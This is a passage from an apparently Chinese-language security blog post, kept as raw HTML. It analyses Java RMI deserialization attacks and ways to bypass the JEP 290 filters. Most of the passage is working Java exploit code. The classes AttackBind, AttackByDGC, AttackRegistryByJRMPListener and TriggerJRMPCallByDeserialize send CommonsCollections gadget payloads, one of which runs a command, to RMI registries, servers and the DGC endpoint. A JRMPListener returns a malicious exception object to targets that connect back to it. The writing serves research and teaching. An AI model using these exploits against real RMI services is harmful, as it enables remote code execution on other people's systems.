class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">methodSignature</span> <span class="operator">=</span> <span class="string">&quot;add(Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;&quot;</span>;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">methodHash</span> <span class="operator">=</span> computeMethodHash(methodSignature);</span><br><span class="line">        sendRawCall(remoteObj.getHost(),remoteObj.getPort(),remoteObj.objID,-<span class="number">1</span>,methodHash,payloadObj);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">        t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>unmarshalParameters</code>中有<code>DeserializationChecker</code>。所以还是可以避免的</p><h5 id="远程方法参数反序列化2-注册中心Registry提供的远程方法"><a href="#远程方法参数反序列化2-注册中心Registry提供的远程方法" class="headerlink" title="远程方法参数反序列化2(注册中心Registry提供的远程方法)"></a>远程方法参数反序列化2(注册中心Registry提供的远程方法)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackBind</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">payloadObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">            <span class="type">ObjID</span> <span class="variable">objID_</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">0</span>);</span><br><span class="line">            sendRawCall(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>,objID_,<span class="number">0</span>,<span class="number">4905912898345647071L</span>,<span class="string">&quot;Test&quot;</span>,payloadObj);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>众所周知，在<code>JEP290</code>出来之前，这个是没有问题的。在其出来之后，主要的过滤点在与</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Status <span class="title function_">registryFilter</span><span class="params">(FilterInfo var0)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Status</span> <span class="variable">var1</span> <span class="operator">=</span> registryFilter.checkInput(var0);</span><br><span class="line">        <span class="keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var0.depth() &gt; <span class="number">20L</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> var0.serialClass();</span><br><span class="line">        <span class="keyword">if</span> (var2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var2.isArray()) &#123;</span><br><span class="line">                <span class="keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> var0.arrayLength() &gt;= <span class="number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="number">1000000L</span> ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哦豁，没得搞了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> CC6.getPayloadObject(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;whatever&quot;</span>, payload);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span>  <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, map);</span><br><span class="line"><span class="type">Remote</span> <span class="variable">obj</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);</span><br><span class="line">registry.bind(<span class="string">&quot;evil&quot;</span>, obj);</span><br></pre></td></tr></table></figure><h5 id="远程函数返回值导致的反序列化"><a href="#远程函数返回值导致的反序列化" class="headerlink" title="远程函数返回值导致的反序列化"></a>远程函数返回值导致的反序列化</h5><p>起一个RMI服务，然后返回值是恶意对象，利用就GG。但是这个攻击手段感觉其实没有什么用….</p><p>但是我们在测试的时候，发现<code>sun.rmi.server.UnicastServerRef#dispatch</code>除了会传入我们使用的远程对象，还会传入一个<code>DGC_Impl</code>的远程对象,这其实就是类似<code>Registry_Impl</code>的一个远程对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">            ObjID[] var7;</span><br><span class="line">            <span class="type">long</span> var8;</span><br><span class="line">            <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="type">boolean</span> var41;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var42</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])((ObjID[])var42.readObject());</span><br><span class="line">                    var8 = var42.readLong();</span><br><span class="line">                    var39 = (VMID)var42.readObject();</span><br><span class="line">                    var41 = var42.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.clean(var7, var8, var39, var41);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var11</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])((ObjID[])var11.readObject());</span><br><span class="line">                    var8 = var11.readLong();</span><br><span class="line">                    var10 = (Lease)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Lease</span> <span class="variable">var40</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var12.writeObject(var40);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到不论是调用远程的什么方法，都会涉及到返回结果的反序列化。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.internal.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.networking.RMIRegistryEndpoint;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.utils.RemoteObjectWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.dem0.rmi.Main.sendRawCall;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackByDGC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">attackRegister</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">2</span>);</span><br><span class="line">        sendRawCall(registryHost, registryPort,  objID, <span class="number">0</span>, -<span class="number">669196253586618813L</span>,payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">attackServer</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">        <span class="type">RMIRegistryEndpoint</span> <span class="variable">rmiRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIRegistryEndpoint</span>(<span class="string">&quot;192.168.111.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteObjectWrapper</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectWrapper</span>(rmiRegistry.lookup(<span class="string">&quot;math&quot;</span>),<span class="string">&quot;math&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">2</span>);</span><br><span class="line">        sendRawCall(remoteObj.getHost(), remoteObj.getPort(),  objID, <span class="number">0</span>, -<span class="number">669196253586618813L</span>,payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        attackRegister();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="异常处理-JRMP协议"><a href="#异常处理-JRMP协议" class="headerlink" title="异常处理(JRMP协议)"></a>异常处理(JRMP协议)</h5><p>在客户端的<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>控制一手var1，就可以了。</p><p><img src="https://img.dem0dem0.top/images/image-20220503145939667.png" alt="image-20220503145939667"></p><p><code>JRMPListener</code>利用就是这里的问题，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doCall</span> <span class="params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">               <span class="keyword">if</span> ( <span class="string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                   <span class="keyword">return</span> ObjID[].class;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                   <span class="keyword">return</span> ObjID.class;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                   <span class="keyword">return</span> UID.class;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Not allowed to read object&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       ObjID read;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           read = ObjID.read(ois);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> ( java.io.IOException e ) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ( read.hashCode() == <span class="number">2</span> ) &#123;</span><br><span class="line">           ois.readInt(); <span class="comment">// method</span></span><br><span class="line">           ois.readLong(); <span class="comment">// hash</span></span><br><span class="line">           System.err.println(<span class="string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       System.err.println(<span class="string">&quot;Sending return with payload for obj &quot;</span> + read);</span><br><span class="line"></span><br><span class="line">       out.writeByte(TransportConstants.Return);<span class="comment">// transport op ==&gt; 81</span></span><br><span class="line">       <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPClient</span>.MarshalOutputStream(out, <span class="built_in">this</span>.classpathUrl);</span><br><span class="line"></span><br><span class="line">       oos.writeByte(TransportConstants.ExceptionalReturn); <span class="comment">// transport var1 ==&gt; 2</span></span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">UID</span>().write(oos);</span><br><span class="line"></span><br><span class="line">       <span class="type">BadAttributeValueExpException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">       Reflections.setFieldValue(ex, <span class="string">&quot;val&quot;</span>, payload);</span><br><span class="line">       oos.writeObject(ex);</span><br><span class="line"></span><br><span class="line">       oos.flush();</span><br><span class="line">       out.flush();</span><br><span class="line"></span><br><span class="line">       <span class="built_in">this</span>.hadConnection = <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">synchronized</span> ( <span class="built_in">this</span>.waitLock ) &#123;</span><br><span class="line">           <span class="built_in">this</span>.waitLock.notifyAll();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>这是因为JEP 290只是在JRMP之上的反序列化过程中注入了Filter，而在JRMP层对错误的处理没有进行反序列化过滤。</code>.</p><p>最后在eki师傅的文章中，想到了server和register的通信中<code>DGC</code>的通信也是基于JRMP，所以同样可以使用。原理同上</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.dem0.rmi.Main.sendRawCall;</span><br><span class="line"><span class="comment">//import static com.dem0.util.Reflections.getFieldValue;</span></span><br><span class="line"><span class="comment">//import static com.dem0.util.Reflections.setFieldValue;</span></span><br><span class="line"><span class="keyword">import</span> com.dem0.utils.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryByJRMPListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">JRMPHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">JRMPPort</span> <span class="operator">=</span> <span class="number">2499</span>;</span><br><span class="line"></span><br><span class="line">            Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="literal">null</span>);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//因为UnicastRemoteObject的默认构造方式是protect的，所以需要反射调用</span></span><br><span class="line"></span><br><span class="line">            <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) constructor.newInstance(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> (TCPEndpoint) Reflections.getFieldValue(Reflections.getFieldValue(Reflections.getFieldValue(remoteObject,<span class="string">&quot;ref&quot;</span>),<span class="string">&quot;ref&quot;</span>),<span class="string">&quot;ep&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//这里直接反射修改对应的值，间接修改构造的序列化数据</span></span><br><span class="line">            Reflections.setFieldValue(ep,<span class="string">&quot;port&quot;</span>,JRMPPort);</span><br><span class="line">            Reflections.setFieldValue(ep,<span class="string">&quot;host&quot;</span>,JRMPHost);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">ObjID</span> <span class="variable">objID_</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Bind(&quot;test&quot;,payloadObj)</span></span><br><span class="line">            sendRawCall(registryHost,registryPort,objID_,<span class="number">0</span>,<span class="number">4905912898345647071L</span>,<span class="string">&quot;test&quot;</span>,remoteObject);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了bypass上面这个过程，上面这个是在已经开始DGC请求的时候触发的，在高版本中orace也对这个进行了修复，所以要利用也就变得难上加难。但是为什么我们在第一次<code>readobject</code>的时候就进行呢？所以有了下面这个触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.internal.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.dem0.utils.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TriggerJRMPCallByDeserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;192.168.59.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JRMPHost</span> <span class="operator">=</span> <span class="string">&quot;192.168.59.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">JRMPPort</span> <span class="operator">=</span> <span class="number">2499</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(JRMPHost, JRMPPort);</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">refObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发关键在于RemoteObjectInvocationHandler的invoke方法</span></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">myInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(refObject);</span><br><span class="line">        <span class="type">RMIServerSocketFactory</span> <span class="variable">handcraftedSSF</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; RMIServerSocketFactory.class, java.rmi.Remote.class &#125;,</span><br><span class="line">                myInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="literal">null</span>);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) constructor.newInstance(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(remoteObject, <span class="string">&quot;ssf&quot;</span>, handcraftedSSF);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serializeData =  ReflectUtils.WriteObjectToBytes(remoteObject);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.readObjectFromBytes(serializeData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是为了触发<code>RemoteObjectInvocationHandler</code>的invoke方法。</p><p>大概的流程就是<code>UnicastRemoteObject#readObject</code>&#x3D;&#x3D;&gt;<code>UnicastRemoteObject#reexport</code>&#x3D;&#x3D;&gt;<code>export</code>&#x3D;&#x3D;&gt;</p><p><img src="https://img.dem0dem0.top/images/image-20220503215649514.png" alt="image-20220503215649514"></p><p>剩下的就跟过去了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invokeRemoteMethod:<span class="number">223</span>, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">invoke:<span class="number">179</span>, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">createServerSocket:-<span class="number">1</span>, $Proxy2 (com.sun.proxy)</span><br><span class="line">newServerSocket:<span class="number">666</span>, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">listen:<span class="number">335</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">254</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">411</span>, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">147</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">exportObject:<span class="number">236</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">exportObject:<span class="number">383</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">exportObject:<span class="number">346</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">reexport:<span class="number">268</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">readObject:<span class="number">235</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">431</span>, ObjectInputStream (java.io)</span><br><span class="line">readObjectFromBytes:<span class="number">108</span>, ReflectUtils (com.dem0.internal)</span><br><span 